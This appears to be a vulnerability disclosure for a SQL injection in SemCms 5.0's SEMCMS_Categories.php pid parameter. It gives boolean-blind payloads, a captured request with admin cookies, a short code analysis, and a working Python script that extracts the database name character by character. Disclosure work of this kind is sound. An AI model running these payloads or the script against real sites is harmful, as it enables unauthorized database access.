# SemCms <= 5.0 has a SQL Injection Vulnerability
##### Vulnerability Location: SEMCMS_Categories.php
##### Affected Range: SemCms <= 5.0
##### Vulnerability Cause: SemCms <= v5.0 was discovered to contain a SQL injection vulnerability.This allows an attacker to execute arbitrary code via the pid parameter in the SEMCMS_Categories.php component.
##### Vulnerability Impact: Obtain database access rights, and even DBA permissions.
##### Link:https://www.sem-cms.com/

# Vulnerability recurrence

After entering the background, click "Product Classification" : SEMCMS_Categories.php

![image](https://github.com/user-attachments/assets/42e4269c-2a60-4f90-99df-b146dab98e39)

Then select a product and click "Edit" :

![image](https://github.com/user-attachments/assets/3bd12aa9-c3b9-47f7-8963-5ac784bd9a49)

The following data packets were captured:

![image](https://github.com/user-attachments/assets/ca46f179-d0b8-463f-a955-148776286139)

![image](https://github.com/user-attachments/assets/735b5b5d-951d-409b-b58e-88942f68411c)

Among them, there is an SQL injection vulnerability in the pid parameter. Test using Boolean blinding:

![image](https://github.com/user-attachments/assets/fdaad18f-0b56-4f45-a3b7-b09ef07daf75)

Here, the first letter of the current database username has been determined. Since the locally set data name, username, and password are all semcms50, when the first character is s, the page echo is normal. However, when the first letter is changed to a, the page echo is abnormal.

![image](https://github.com/user-attachments/assets/4319d95b-89dd-4e76-9514-8fd1de8991e5)

payload, first determine the length of the database name: pid=if(length(database())>8,99,0)

![image](https://github.com/user-attachments/assets/d37fd00d-e750-43a4-8973-e2d16fe3936c)

![image](https://github.com/user-attachments/assets/e60b3a69-aea0-4373-83ac-dac718057541)

It can be seen that the length of the database name is greater than 7 but not greater than 8. Therefore, the length of the obtained database is 8. The next step is to determine the specific value of the database name.

![image](https://github.com/user-attachments/assets/1ed30880-ab06-4f58-a679-f61fab975684)

Finally, the database username is obtained as semcms50, and the yakit data packet:

```
GET /admin/SEMCMS_Categories.php?type=edit&pid=if(substr(database(),{{int(1-8)}},1)%20like%20"{{payload(word)}}",99,2)&lgid=1&types=p HTTP/1.1
Host: localhost:83
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost:83/admin/SEMCMS_Categories.php?pid=1&lgid=1
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate, br, zstd
Sec-Fetch-Site: same-origin
Sec-Fetch-Dest: frame
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9
Cookie: scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b
```

# Code Analysis
Line 34 of `SEMCMS_Categories.php`

![image](https://github.com/user-attachments/assets/c1d06b72-645a-433e-97eb-1fc9f4d7cad6)

The pid parameters were directly concatenated into the SQL statement, thereby causing an SQL injection vulnerability

# Vulnerability exploitation script
```
import requests
import string
import time
from urllib.parse import parse_qs, urlencode
# 需要通过页面的回显来修改判断的条件
# 需要后台路径
# 需要更新Cookie



# 发送请求
def send_request(url, headers):
    try:
        response = requests.get(
            url,
            headers=headers,
            timeout=10,
            verify=False
        )

        return response
    except Exception as e:
        print(f"请求失败: {e}")
        return None


# 爆破数据库名长度
def database_length():
    print("[*] 开始爆破数据库名长度...")
    for i in range(1,20):
        base_url = url + f'if(length(database())>{i},999,98)'
        resp = send_request(base_url,header).text
        if 'Lorem' in resp:
            print("数据库名长度为：" + str(i))
            return i 
            

# 爆破数据库名
def exploit_sql_injection(url, header, db_len):
    
    
    db_name = ""
    
    max_length = 32  # 假设数据库名最大长度
    
    # 字符集：小写字母、数字、常见符号
    charset = string.ascii_lowercase + string.digits + "-$@! "
    

    print("[*] 开始爆破数据库名...")

    for i in range(1,db_len+1):
        for j in charset:
            base_url = url + f'if(substr(database(),{i},1) like "{j}",98,999)'
            resp = send_request(base_url, header).text
            if 'Lorem' in resp:
                db_name += str(j)
                print(f"[+] 第{i}个位置的字符: '{j}' 匹配成功, 当前: {db_name}")
                break

    
    print(f"[*] 爆破完成! 数据库名: {db_name}")
    return db_name

if __name__ == "__main__":
    url = f"http://192.168.124.6:81/VvK4qw_Admin/SEMCMS_Categories.php?type=edit&lgid=1&types=p&pid="
    
    header = {
        "Cookie":"scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b"
    }

    db_len = database_length()

    if(db_len != 0):
        exploit_sql_injection(url, header,db_len)
    
```
